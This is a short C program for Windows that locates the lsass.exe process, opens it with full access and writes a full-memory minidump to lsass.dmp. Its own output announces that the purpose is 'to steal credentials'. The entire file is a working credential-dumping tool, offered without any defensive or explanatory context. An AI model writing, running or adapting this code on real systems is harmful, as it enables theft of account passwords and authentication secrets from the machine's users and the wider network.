#include <windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")

int main() {
	//wprintf(L"[PID] %i\t%s \n", procSentry.th32ProcessID, procSentry.szExeFile);

	printf("[>] Create a mini-dump DMP file for lsass.exe to steal credentials\n\n");

	HANDLE procSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPALL, 0);
	printf("[+] Created a snapshot of running processes on the system\n");
	DWORD lsassPid = 0;
	if (procSnapshot != INVALID_HANDLE_VALUE)
	{

		PROCESSENTRY32 procSentry;
		procSentry.dwSize = sizeof(PROCESSENTRY32);
		BOOL firstProc = Process32First(procSnapshot, &procSentry);
		LPCWSTR procName = L"";

		if (Process32First(procSnapshot, &procSentry))
		{
			while (_wcsicmp(procName, L"lsass.exe") != 0)
			{

				Process32Next(procSnapshot, &procSentry);
				procName = procSentry.szExeFile;
				lsassPid = procSentry.th32ProcessID;

			}
			printf("[+] Located lsass.exe as PID - %i\n", lsassPid);
		}

		HANDLE outputFile = CreateFileA("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		printf("[+] Created a lsass.dmp file for the mini-dump\n");

		HANDLE openProc = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPid);

		printf("[+] Opened a handle to lsass by PID - %i\n", lsassPid);

		BOOL dump = MiniDumpWriteDump(openProc, lsassPid, outputFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
		if (dump)
		{
			printf("[+] Successfully created a mini-dump for lsass.exe\n");
		}
	}

	return 0;
}
